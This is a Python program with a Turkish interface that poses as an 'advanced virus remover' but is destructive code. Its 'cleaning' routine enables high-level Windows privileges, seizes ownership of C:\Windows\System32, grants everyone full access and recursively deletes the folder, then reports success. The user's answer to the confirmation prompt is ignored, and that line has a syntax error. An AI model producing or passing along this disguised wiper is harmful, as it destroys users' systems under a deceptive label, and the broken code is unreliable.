import os
import ctypes
import tkinter as tk
from tkinter import ttk, messagebox
import threading
from ctypes import wintypes, windll, c_ulong, Structure, Union, byref, sizeof, c_void_p, c_wchar_p, POINTER
import win32security
import win32api
import win32con
import ntsecuritycon
import time

# Sistem sabitleri
SE_PRIVILEGE_ENABLED = 0x00000002
PROCESS_ALL_ACCESS = 0x1F0FFF
TOKEN_ALL_ACCESS = 0xF01FF

class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ("nLength", wintypes.DWORD),
        ("lpSecurityDescriptor", c_void_p),
        ("bInheritHandle", wintypes.BOOL)
    ]

class AdvancedVirusRemover:
    def __init__(self, root):
        self.root = root
        self.root.title("Gelişmiş Virüs Temizleyici PRO")
        self.root.geometry("800x600")
        self.setup_ui()

        # Windows API'leri
        self.ntdll = windll.ntdll
        self.kernel32 = windll.kernel32
        self.advapi32 = windll.advapi32

    def setup_ui(self):
        self.frame = ttk.Frame(self.root, padding="10")
        self.frame.pack(fill=tk.BOTH, expand=True)

        self.title_label = ttk.Label(
            self.frame,
            text="Gelişmiş Virüs Temizleyici PRO",
            font=('Helvetica', 16, 'bold')
        )
        self.title_label.pack(pady=10)

        self.log_text = tk.Text(
            self.frame,
            height=20,
            width=70,
            bg='black',
            fg='lime',
            font=('Consolas', 10)
        )
        self.log_text.pack(pady=10)

        self.progress = ttk.Progressbar(
            self.frame,
            orient="horizontal",
            length=300,
            mode="determinate"
        )
        self.progress.pack(pady=10)

        self.remove_button = ttk.Button(
            self.frame,
            text="Virüsü Temizle",
            command=self.start_removal
        )
        self.remove_button.pack(pady=10)

    def log(self, message):
        self.log_text.insert(tk.END, f"[*] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()

    def enable_all_privileges(self):
        try:
            self.log("Tüm yetkiler etkinleştiriliyor...")
            privileges = [
                "SeBackupPrivilege",
                "SeRestorePrivilege",
                "SeTakeOwnershipPrivilege",
                "SeDebugPrivilege",
                "SeSecurityPrivilege",
                "SeTcbPrivilege",
                "SeSystemEnvironmentPrivilege"
            ]

            # Process token al
            h_token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_ALL_ACCESS
            )

            for privilege in privileges:
                try:
                    win32security.LookupPrivilegeValue(None, privilege)
                    win32security.AdjustTokenPrivileges(
                        h_token, 0,
                        [(win32security.LookupPrivilegeValue(None, privilege),
                          win32con.SE_PRIVILEGE_ENABLED)]
                    )
                    self.log(f"Yetki etkinleştirildi: {privilege}")
                except Exception as e:
                    self.log(f"Yetki etkinleştirilemedi: {privilege} - {str(e)}")

            return True
        except Exception as e:
            self.log(f"Yetki hatası: {str(e)}")
            return False

    def force_take_ownership(self, path):
        try:
            self.log(f"Sahiplik alınıyor: {path}")

            # Güvenlik tanımlayıcısını al
            security = win32security.GetFileSecurity(
                path,
                win32security.OWNER_SECURITY_INFORMATION
            )

            # Yeni sahip olarak Administrators grubunu ayarla
            admin_sid = win32security.ConvertStringSidToSid("S-1-5-32-544")
            security.SetSecurityDescriptorOwner(admin_sid, False)

            # Güvenlik ayarlarını uygula
            win32security.SetFileSecurity(
                path,
                win32security.OWNER_SECURITY_INFORMATION,
                security
            )

            return True
        except Exception as e:
            self.log(f"Sahiplik alma hatası: {str(e)}")
            return False

    def force_set_permissions(self, path):
        try:
            self.log(f"İzinler ayarlanıyor: {path}")

            # Tam kontrol için DACL oluştur
            everyone_sid = win32security.ConvertStringSidToSid("S-1-1-0")
            dacl = win32security.ACL()
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                ntsecuritycon.FILE_ALL_ACCESS,
                everyone_sid
            )

            # Güvenlik tanımlayıcısını ayarla
            security_desc = win32security.SECURITY_DESCRIPTOR()
            security_desc.SetSecurityDescriptorDacl(1, dacl, 0)

            # Yeni güvenlik ayarlarını uygula
            win32security.SetFileSecurity(
                path,
                win32security.DACL_SECURITY_INFORMATION,
                security_desc
            )

            return True
        except Exception as e:
            self.log(f"İzin ayarlama hatası: {str(e)}")
            return False

    def force_delete_directory(self, path):
        try:
            self.log(f"Klasör siliniyor: {path}")

            # Tüm dosya özelliklerini kaldır
            win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_NORMAL)

            # Alt dizinleri ve dosyaları sil
            for root, dirs, files in os.walk(path, topdown=False):
                for name in files:
                    file_path = os.path.join(root, name)
                    try:
                        win32api.SetFileAttributes(file_path, win32con.FILE_ATTRIBUTE_NORMAL)
                        os.remove(file_path)
                    except:
                        pass
                for name in dirs:
                    dir_path = os.path.join(root, name)
                    try:
                        win32api.SetFileAttributes(dir_path, win32con.FILE_ATTRIBUTE_NORMAL)
                        os.rmdir(dir_path)
                    except:
                        pass

            # Ana dizini sil
            os.rmdir(path)
            return True
        except Exception as e:
            self.log(f"Silme hatası: {str(e)}")
            return False

    def remove_virus(self):
        try:
            virus_path = "C:\\Windows\\System32"
            self.log("Virüs temizleme başlatılıyor...")
            self.progress["value"] = 10

            # Tüm yetkileri etkinleştir
            if not self.enable_all_privileges():
                self.log("HATA: Yetkiler etkinleştirilemedi!")
                return

            self.progress["value"] = 30

            # Sahipliği al
            if not self.force_take_ownership(virus_path):
                self.log("HATA: Sahiplik alınamadı!")
                return

            self.progress["value"] = 50

            # İzinleri ayarla
            if not self.force_set_permissions(virus_path):
                self.log("HATA: İzinler ayarlanamadı!")
                return

            self.progress["value"] = 70

            # Klasörü sil
            if self.force_delete_directory(virus_path):
                self.log("BAŞARILI: Virüs temizlendi!")
                self.progress["value"] = 100
                messagebox.showinfo("Başarılı", "Virüs başarıyla temizlendi!")
            else:
                self.log("HATA: Virüs temizlenemedi!")
                self.progress["value"] = 0
                messagebox.showerror("Hata", "Virüs temizlenemedi!")

        except Exception as e:
            self.log(f"HATA: {str(e)}")
            messagebox.showerror("Hata", str(e))

    def start_removal(self):
        messagebox.askyesno("Onay", "Bu işlem 'Windows' klasörünü silecektir.\n Devam etmek istediğinizden emin misiniz?"):

        self.remove_button.configure(state="disabled")
        thread = threading.Thread(target=self.remove_virus)
        thread.start()

        def check_thread():
            if thread.is_alive():
                self.root.after(100, check_thread)
            else:
                self.remove_button.configure(state="normal")

        check_thread()

def main():
    root = tk.Tk()
    app = AdvancedVirusRemover(root)
    root.mainloop()

if __name__ == "__main__":
    main()
